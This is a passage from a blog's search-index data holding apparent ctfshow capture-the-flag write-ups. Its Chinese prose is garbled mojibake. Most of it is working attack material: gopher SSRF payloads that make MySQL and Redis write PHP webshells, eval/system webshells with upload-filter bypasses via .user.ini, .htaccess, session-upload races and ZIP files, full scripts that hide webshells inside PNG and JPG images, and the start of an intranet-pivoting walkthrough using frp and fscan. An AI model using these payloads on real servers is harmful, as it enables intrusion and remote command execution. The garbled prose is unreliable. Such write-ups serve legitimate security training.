1gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254f%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2527%2563%256d%2564%2527%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2573%2568%2565%256c%256c%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501 web360(redis)1234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt; é¢˜ç›®æç¤ºäº†æ‰“redisï¼Œ å°è¯•å¾€webç›®å½•å†™webshell åˆ©ç”¨gopherus 1234567891011./gopherus.py --exploit redisWhat do you want?? (ReverseShell/PHPShell): phpshellGive web root location of server (default is /var/www/html): Give PHP Payload (We have default PHP Shell): Your gopher link is Ready to get PHP Shell: gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A","link":"/2024/01/22/ctfshow(ssrf)/"},{"title":"ctfshow(upload)","text":"web151(å‰ç«¯æ ¡éªŒ)å‰ç«¯éªŒè¯ï¼Œä¿®æ”¹pngä¸ºphp 1lay-data=&quot;{url: 'upload.php', accept: 'images',exts:'php'}&quot; ä¸Šä¼ phpæ–‡ä»¶ 1234&lt;?phpeval($_POST[1]);phpinfo();?&gt; web152(content-type)é€šè¿‡å‰ç«¯æ ¡éªŒåä¸Šä¼ phpæ–‡ä»¶æ˜¾ç¤ºæ–‡ä»¶ç±»å‹ä¸åˆè§„ å°è¯•æŠ“åŒ…ä¿®æ”¹content-typeï¼Œæ ¹æ®æ•°æ®åŒ…å›æ˜¾å¾—çŸ¥ä¸Šä¼ æˆåŠŸã€‚ 12345678910111213141516171819202122232425POST /upload.php HTTP/1.1Host: ef68ad4a-40fd-479c-aa14-0a4c9d2c0650.challenge.ctf.showContent-Length: 217Pragma: no-cacheCache-Control: no-cacheAccept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWg0lhgBOIRNo5bIGOrigin: http://ef68ad4a-40fd-479c-aa14-0a4c9d2c0650.challenge.ctf.showReferer: http://ef68ad4a-40fd-479c-aa14-0a4c9d2c0650.challenge.ctf.show/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundaryWg0lhgBOIRNo5bIGContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.php&quot;Content-Type: image/png&lt;?phpeval($_POST[1]);phpinfo();?&gt;------WebKitFormBoundaryWg0lhgBOIRNo5bIG-- web153(.user.ini)è™½ç„¶å°†åç¼€åæ”¹ä¸ºphtml,php5ç­‰ï¼Œå¯ä»¥ä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯æœåŠ¡å™¨å¹¶ä¸è§£æ .user.iniæ–‡ä»¶å…¶å®å°±æ˜¯PHPçš„ä¸€ä¸ªå±€éƒ¨é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡é…ç½®é€‰é¡¹ä½¿æ¯ä¸ªphpæ–‡ä»¶å¤´æˆ–æ–‡ä»¶å°¾éƒ½è¿›è¡Œæ–‡ä»¶åŒ…å« .htaccessæ–‡ä»¶æ˜¯Apache WebæœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶ï¼›Nginxå¹¶ä¸ä½¿ç”¨.htaccessæ–‡ä»¶ 12auto_prepend_file = &lt;filename&gt; //åŒ…å«åœ¨æ–‡ä»¶å¤´auto_append_file = &lt;filename&gt; //åŒ…å«åœ¨æ–‡ä»¶å°¾ payload ä¸Šä¼ a.png 1234&lt;?phpeval($_POST[1]);phpinfo();?&gt; ä¸Šä¼ .user.ini 1auto_prepend_file = a.png web154-155(å†…å®¹æ£€æµ‹â€phpâ€)payload åˆ©ç”¨ä¸Šé¢˜çš„æ–¹æ³•ï¼Œå°†a.pngçš„å†…å®¹æ”¹æˆå¦‚ä¸‹ï¼Œåˆ©ç”¨çŸ­æ ‡ç­¾ 123&lt;?=eval($_POST[1]);?&gt; PHPå››ç§æ ‡è®°é£æ ¼ 1.XMLé£æ ¼ 123&lt;?phpeval($_POST['cmd']); ?&gt; phpæ¨èä½¿ç”¨çš„æ ‡è®°é£æ ¼ã€‚æœåŠ¡å™¨ç®¡ç†å‘˜æ— æ³•ç¦ç”¨ï¼Œæ‰€æœ‰æœåŠ¡å™¨ä¸Šå‡å¯ä½¿ç”¨è¯¥é£æ ¼ã€‚ 2.è„šæœ¬é£æ ¼ 123&lt;script language=&quot;php&quot;&gt; eval($_POST['cmd']);&lt;/script&gt; é»˜è®¤å¼€å¯ï¼Œæ— æ³•ç¦ç”¨ç¬”è€…æ›¾é‡åˆ°è¿‡ä¸€CTFé¢˜ç›®ï¼Œè¦æ±‚ä¸Šä¼ shellï¼Œä½†æ˜¯å´å¯¹æ–‡ä»¶å†…å®¹åšäº†è¿‡æ»¤ ï¼Œ&lt;? ä»¥åŠ phpï¼Œæ›¿æ¢ä¸ºäº†ç©ºæ ¼ã€‚æ­¤ç§é£æ ¼ä¸­ï¼Œlanguageçš„å€¼ï¼Œå¤§å°å†™éƒ½å¯ä»¥ï¼Œå› æ­¤å¯ä»¥æ„é€ å¦‚ä¸‹ä»£ç è¿›è¡Œç»•è¿‡ 123&lt;script language=&quot;PhP&quot;&gt; eval($_POST['cmd']);&lt;/script&gt; 3.ç®€çŸ­é£æ ¼ 123&lt;? eval($_POST['cmd']);?&gt; æ­¤ç§é£æ ¼éœ€è¦åœ¨é…ç½®æ–‡ä»¶php.iniä¸­å¯ç”¨short_open_tageé€‰é¡¹æ­¤ç§é£æ ¼åœ¨è®¸å¤šç¯å¢ƒä¸­é»˜è®¤æ˜¯ä¸æ”¯æŒçš„ 4.ASPé£æ ¼ 123&lt;% eval($_POST['cmd']);%&gt; æ­¤ç§é£æ ¼éœ€è¦åœ¨é…ç½®æ–‡ä»¶php.iniä¸­å¯ç”¨asp_tagé€‰é¡¹åœ¨é»˜è®¤æƒ…å†µä¸‹æ˜¯ç¦ç”¨çš„åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/qq_35085863/article/details/76714367 web156(å†…å®¹æ£€æµ‹â€™[â€˜)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-10-24 19:34:52# @Last Modified by: h1xa# @Last Modified time: 2020-10-26 15:49:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){ $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;$_FILES[&quot;file&quot;][&quot;error&quot;]);}else{ $filename = $_FILES[&quot;file&quot;][&quot;name&quot;]; $filesize = ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024); if($filesize&gt;1024){ $ret = array(&quot;code&quot;=&gt;1,&quot;msg&quot;=&gt;&quot;æ–‡ä»¶è¶…è¿‡1024KB&quot;); }else{ if($_FILES['file']['type'] == 'image/png'){ $arr = pathinfo($filename); $ext_suffix = $arr['extension']; if($ext_suffix!='php'){ $content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]); if(stripos($content, &quot;php&quot;)===FALSE &amp;&amp; stripos($content,&quot;[&quot;)===FALSE){ move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]); $ret = array(&quot;code&quot;=&gt;0,&quot;msg&quot;=&gt;&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]); }else{ $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;æ–‡ä»¶ç±»å‹ä¸åˆè§„&quot;); } }else{ $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;æ–‡ä»¶ç±»å‹ä¸åˆè§„&quot;); } }else{ $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;æ–‡ä»¶ç±»å‹ä¸åˆè§„&quot;); } }}echo json_encode($ret); stripos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰; è¿‡æ»¤äº†**[ ]** å¯ä»¥ç”¨{}æ›¿ä»£ web157-158(å†…å®¹æ£€æµ‹ â€˜{}â€™ ,â€™;â€™)payload,phpæœ€åä¸€å¥è¯å¯ä»¥ä¸ç”¨åŠ åˆ†å· 123&lt;?= system('tac ../f*')?&gt; web159(å†…å®¹æ£€æµ‹â€()â€ï¼Œâ€logâ€)ä½¿ç”¨åå¼•å· 12&lt;=echo `whoami` web160(å†…å®¹æ£€æµ‹ç©ºæ ¼)ä½¿å¾—a.pngçš„å†…å®¹å¦‚ä¸‹ï¼ŒåŒ…å«æ—¥å¿—æ–‡ä»¶ 1&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt; web161-162æ–‡ä»¶å¤´æ£€æµ‹)ä¸Šä¼ æ–‡ä»¶æ—¶åŠ ä¸Šå›¾ç‰‡æ–‡ä»¶å¤´ 1GIF89a web163(å†…å®¹æ£€æµ‹ â€œ.â€)åˆ©ç”¨.user.iniï¼Œä½¿å¾—æ–‡ä»¶åŒ…å«/tmp/sess_id;æˆ‘è¿™é‡Œå¹¶æ²¡æœ‰ä»å“ªé‡Œçœ‹å‡ºæ¥å¼€å¯äº†session; ä¸Šä¼ .user.iniæ–‡ä»¶ 12GIF89aauto_prepend_file=/tmp/sess_zixyd è¡¨å• 123456789&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://d0908251-27cd-4ecc-b549-e6d9c1a0abdc.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;1&lt;?php system('cat ../flag.php');?&gt;&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; payloadï¼Œç”¨bpçš„intruder, 12345678910111213141516171819202122232425POST / HTTP/1.1Host: d0908251-27cd-4ecc-b549-e6d9c1a0abdc.challenge.ctf.showContent-Length: 324Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: nullContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryjvhYci6ebBvox39yUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateCookie: PHPSESSID=zixydAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundaryjvhYci6ebBvox39yContent-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;Â§1Â§&lt;?php system('cat ../flag.php');?&gt;------WebKitFormBoundaryjvhYci6ebBvox39yContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.txt&quot;Content-Type: text/plainzixyd------WebKitFormBoundaryjvhYci6ebBvox39y-- 123456789101112GET /upload/index.php HTTP/1.1Host: d0908251-27cd-4ecc-b549-e6d9c1a0abdc.challenge.ctf.showPragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeÂ§1Â§ web164(pngäºŒæ¬¡æ¸²æŸ“)ç›´æ¥ç”¨å¤§ä½¬çš„è„šæœ¬ç”Ÿæˆæœ¨é©¬æ–‡ä»¶ 1234567891011121314151617181920212223242526272829303132&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);}imagepng($img,'1.png'); //è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„/* æœ¨é©¬å†…å®¹&lt;?$_GET[0]($_POST[1]);?&gt; *///imagepng($img,'1.png'); è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„,1.pngæ˜¯ä½¿ç”¨çš„æ–‡ä»¶ï¼Œå¯ä»¥ä¸å­˜åœ¨//ä¼šåœ¨ç›®å½•ä¸‹è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª1.pngå›¾ç‰‡//å›¾ç‰‡è„šæœ¬å†…å®¹ï¼š$_GET[0]($_POST[1]);//ä½¿ç”¨æ–¹æ³•ï¼šä¾‹å­ï¼šæŸ¥çœ‹å›¾ç‰‡ï¼Œgetä¼ å…¥0=systemï¼›postä¼ å…¥tac flag.php?&gt; web165(jpgäºŒæ¬¡æ¸²æŸ“)jpgçš„æˆåŠŸç‡å¾ˆä½ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149&lt;?php#ç”¨æ³•ï¼Œåœ¨ç›®å½•é‚£é‡Œcmdæ‰“å¼€ç„¶åphp æ–‡ä»¶å å›¾ç‰‡å$miniPayload = '&lt;?=eval($_POST[1]);?&gt;';if (!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { die('php-gd is not installed');}if (!isset($argv[1])) { die('php jpg_payload.php &lt;jpg_name.jpg&gt;');}set_error_handler(&quot;custom_error_handler&quot;);for ($pad = 0; $pad &lt; 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if ($dis-&gt;readShort() != 0xFFD8) { die('Incorrect SOI marker'); } while ((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) { $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if ($marker === 0xDA) { $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;, $nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_' . $argv[1], $outStreamTmp, TRUE); if ($extraBytes !== 0) { while ((!$dis-&gt;eof())) { if ($dis-&gt;readByte() === 0xFF) { if ($dis-&gt;readByte !== 0x00) { break; } } } $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;, $nullbytePayloadSize) . substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize + $imageStreamSize - $extraBytes) . substr($outStream, $stopPos); } elseif ($correctImage) { $outStream = $outStreamTmp; } else { break; } if (checkImage('payload_' . $argv[1], $outStream)) { die('Success!'); } else { break; } } }}unlink('payload_' . $argv[1]);die('Something\\'s wrong');function checkImage($filename, $data, $unlink = FALSE){ global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if ($unlink) unlink($filename); return $correctImage;} function custom_error_handler($errno, $errstr, $errfile, $errline){ global $extraBytes, $correctImage; $correctImage = FALSE; if (preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { if (isset($m[1])) { $extraBytes = (int)$m[1]; } }} class DataInputStream{ private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-&gt;binData = ''; $this-&gt;order = $order; if (!$fromString) { if (!file_exists($filename) || !is_file($filename)) die('File not exists [' . $filename . ']'); $this-&gt;binData = file_get_contents($filename); } else { $this-&gt;binData = $filename; } $this-&gt;size = strlen($this-&gt;binData); } public function seek() { return ($this-&gt;size - strlen($this-&gt;binData)); } public function skip($skip) { $this-&gt;binData = substr($this-&gt;binData, $skip); } public function readByte() { if ($this-&gt;eof()) { die('End Of File'); } $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); } public function readShort() { if (strlen($this-&gt;binData) &lt; 2) { die('End Of File'); } $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if ($this-&gt;order) { $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); } else { $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); } return $short; } public function eof() { return !$this-&gt;binData || (strlen($this-&gt;binData) === 0); }} ?&gt; web166(zipæ–‡ä»¶åŒ…å«)åªèƒ½ä¸Šä¼ zipæ–‡ä»¶ 1lay-data=&quot;{url: 'upload.php', accept: 'images',exts:'zip'}&quot; download.phpå­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œ 1upload/download.php?file=e46801abff88087e1938a39472b8a1f0.zip éšä¾¿å‹ç¼©ä¸€ä¸ªæ–‡ä»¶ï¼Œå³å‡»å‹ç¼©åçš„zipæ–‡ä»¶æ‰“å¼€ï¼›åŠ ä¸Šæœ¨é©¬ 123456PK\u0003\u0004 ç»¬3X8?Q\u0003 \u0003 \u0005 1.txtéŸå¥K\u0001\u0002? ç»¬3X8?Q\u0003 \u0003 \u0005 $ 1.txt \u0001 \u0018 U?ç¤˜? PK\u0005\u0006 \u0001 \u0001 W &amp; &lt;?php @eval($_POST[1]);?&gt; ä¸Šä¼ ä¹‹åï¼Œç›´æ¥ç”¨èšå‰‘å³å¯è¿æ¥ 12url: http://38b16135-3b29-49f9-aa9e-63f555279256.challenge.ctf.show/upload/download.php?file=e46801abff88087e1938a39472b8a1f0.zippass: 1 web167(htaccess)hint:httpd htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ ä¸Šä¼ 1.jpgæ–‡ä»¶ 1234&lt;?phpeval($_POST[1]);phpinfo();?&gt; ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œå¹¶æŠŠ1.jpgæ–‡ä»¶ç”¨phpè§£æ 123&lt;FilesMatch &quot;1.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; å…¶å®è¿™ä¸ªæˆ‘æ„Ÿè§‰æŒºå¥‡æ€ªçš„ï¼Œå“åº”æ ‡å¤´è¡¨ç¤ºçš„æ˜¯nginxæœåŠ¡å™¨ï¼Œä½†æ˜¯å´å¯ä»¥ç”¨htaccessé…ç½®æ–‡ä»¶ï¼Ÿ 12345678HTTP/1.1 200 OKServer: nginx/1.20.1Date: Fri, 19 Jan 2024 10:07:18 GMTContent-Type: text/html; charset=UTF-8Content-Length: 1657Connection: closeVary: Accept-EncodingX-Powered-By: PHP/5.6.40 web168(å§¿åŠ¿ç»•è¿‡)ç»è¿‡æµ‹è¯•å‘ç°ï¼Œæ–‡ä»¶ä¸Šä¼ ç‚¹å°†evalå’Œsystemä»¥åŠpostå’Œgetè¿‡æ»¤äº†ä¹Ÿå¯ä»¥ä½¿ç”¨åå¼•å·æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œé€šè¿‡ä¸æ–­ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶ä¸­çš„å†…å®¹å’Œä¸æ–­è®¿é—®è¯¥æ–‡ä»¶æ¥è·å–flag 1&lt;?php echo `tac ../f*`;?&gt; è¿˜æœ‰å…¶ä»–æ–¹å¼ï¼› 1234&lt;?php$a=substr(&quot;1sys&quot;,1).&quot;tem&quot;; è¿”å›å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä½ä»¥åçš„å­—ç¬¦ä¸²$a($_REQUEST['pass']);?&gt; web169-170(è¿‡æ»¤äº†â€&lt;â€)åæ§½ï¼šåªèƒ½ä¸Šä¼ zipæ–‡ä»¶ï¼Œä½†æ˜¯Content-Typeåˆå¿…é¡»æ˜¯å›¾ç‰‡ç±»å‹ï¼› éšä¾¿ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶ï¼Œç„¶åç”¨.user.iniåŒ…å«æ—¥å¿—æ–‡ä»¶ 1234Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;.user.ini&quot;Content-Type: image/pngauto_prepend_file=/var/log/nginx/access.log","link":"/2024/01/19/ctfshow(upload)/"},{"title":"frp+proxifierå†…ç½‘ç©¿é€","text":"frpå†…ç½‘ç©¿é€åœ¨é•¿æ²™å†œå¤§ä¸€æ¬¡çº¿ä¸‹èµ›æ—¶ï¼Œåªç»™åˆ°äº†ä¸€å°æœºå™¨çš„ipï¼›å…¶ä»–æœºå™¨éƒ½æ˜¯åœ¨å†…ç½‘ä¹‹ä¸­ï¼Œå¤–ç½‘è®¿é—®ä¸åˆ°ï¼Œéœ€è¦é€šè¿‡ç»™çš„ä¸€å°æœºå™¨æ¥å†…ç½‘ç©¿é€åˆ°å…¶ä»–å†…ç½‘æœºå™¨ï¼›å½“æ—¶æ‰“æ¯”èµ›ä¹Ÿæƒ³åˆ°äº†è¿™ä¸€ç‚¹ã€‚å¯æƒœçš„æ˜¯ï¼Œæˆ‘åˆšå‡†å¤‡ä¸Šä¼ frpå·¥å…·æ—¶ï¼Œæ‰å‘ç°æˆ‘åªä¸‹è½½äº†windowsç‰ˆæœ¬ï¼›å½“æ—¶ç–å¿½å¤§æ„ï¼Œæ²¡æœ‰å‡†å¤‡frpçš„linuxç‰ˆæœ¬ï¼›(å½“ç„¶å†…ç½‘ç©¿é€çš„å·¥å…·è¿˜æœ‰å¾ˆå¤š)ï¼›ç°åœ¨æƒ³æƒ³è¿˜æŒºå¯æƒœçš„ï¼›è¶ç€å¯’å‡æ²¡äº‹åšï¼Œé‡æ–°å¤ç°ä¸€ä¸‹frpå¦‚ä½•å†…ç½‘ç©¿é€ï¼› å®éªŒç¯å¢ƒï¼šâ€‹ windows11;kali;docker; å®éªŒå†…å®¹ï¼šâ€‹ åœ¨kaliä¸Šä½¿ç”¨dockerå¼€å¯ä¸¤ä¸ªå®¹å™¨ï¼Œä¸€ä¸ªå®¹å™¨Aé€šè¿‡ç«¯å£è½¬å‘ä½¿å¾—windowå¯ä»¥é€šè¿‡kaliçš„ipåŠ è½¬å‘çš„ç«¯å£è®¿é—®ï¼Œå¦ä¸€ä¸ªå®¹å™¨Bä¸åšä»»ä½•è½¬å‘ï¼Œ å®éªŒç›®çš„ï¼šâ€‹ ä½¿å¾—windowsé€šè¿‡å®¹å™¨Aä½¿ç”¨frpå·¥å…·å†…ç½‘ç©¿é€åˆ°å¯ä»¥è®¿é—®å®¹å™¨B; æˆ‘æ¯”è¾ƒæ‡’ï¼Œä¸¤ä¸ªå®¹å™¨ç”¨çš„æ˜¯åŒä¸€ä¸ªé•œåƒï¼›frp_oneåˆ™æ˜¯å®¹å™¨Açš„ä½œç”¨ï¼Œå®ç°ç«¯å£è½¬å‘;frp_twoåˆ™æ˜¯å®¹å™¨Bçš„ä½œç”¨; é€šè¿‡kaliçš„ipåŠ è½¬å‘çš„ç«¯å£è®¿é—®ï¼Œå†…å®¹å°±æ˜¯ä¸€å¥è¯æœ¨é©¬(è¿˜æ˜¯ä¹‹å‰å®éªŒå®¤å†…éƒ¨è€ƒæ ¸èµ›çš„é•œåƒ)ï¼Œå®¹å™¨å†…å®¹æ— æ‰€è°“çš„ï¼Œåªè¦æ–¹ä¾¿è¿èšå‰‘å°±è¡Œï¼› ç›´æ¥ç”¨èšå‰‘è¿æ¥ å½“ä¸çŸ¥é“å†…ç½‘å…¶ä»–æœºå™¨çš„ipæ—¶ï¼Œå¯ä»¥å…ˆé€šè¿‡è‡ªå·±æ‰‹åŠ¨å†…ç½‘æœé›†ï¼Œæ¥ç¡®å®šå…¶ä»–ipåœ°å€ï¼Œæ¯”å¦‚/proc/net/arp(å½“ä¸å…¶ä»–æœºå™¨é€šä¿¡æ—¶ï¼Œarpåè®®ä¼šè®°å½•å¯¹æ–¹çš„ipå’Œmacåœ°å€)ï¼› 1234www-data:/var/www/html) $ cat /proc/net/arpIP address HW type Flags HW address Mask Device172.17.0.1 0x1 0x2 02:42:91:ca:3b:2a * eth0172.17.0.3 0x1 0x2 02:42:ac:11:00:03 * eth0 å½“ç„¶ä¹Ÿå¯ä»¥å€Ÿç”¨fscanç­‰å·¥å…·ï¼›åˆ©ç”¨èšå‰‘ä¸Šä¼ ï¼› 1./fscan_amd64 -h 172.17.0.1/24 123456172.17.0.2:80 open172.17.0.3:80 open172.17.0.1:8080 open[*] WebTitle: http://172.17.0.2 code:200 len:758 title:None[*] WebTitle: http://172.17.0.3 code:200 len:758 title:None[*] WebTitle: http://172.17.0.1:8080 code:200 len:758 title:None é€šè¿‡ä»¥ä¸Šä»‹ç»çš„ä¸¤ç§æ–¹æ³•å¯ä»¥ç¡®å®šå†…ç½‘ä¸­è¿˜å­˜åœ¨ä¸€ä¸ªip172.17.0.3å¹¶ä¸”è¿™ä¸ªipå¼€æ”¾ç€80ç«¯å£ï¼› æˆ‘ä»¬å°è¯•é€šè¿‡frpå·¥å…·æ¥å†…ç½‘ç©¿é€ï¼Œä»¥è‡´äºå¯ä»¥è®¿é—®172.17.0.3:80; ä¸Šä¼ frpæˆåŠŸåï¼›ä¿®æ”¹frpc.inié…ç½®å¦‚ä¸‹ï¼›server_addræ ¹æ®æƒ…å†µè€Œå®šï¼Œæˆ‘è¿™é‡Œæ˜¯å› ä¸ºæˆ‘çš„æ”»å‡»æœºwindowsçš„åœ°å€æ˜¯192.168.0.55;å› 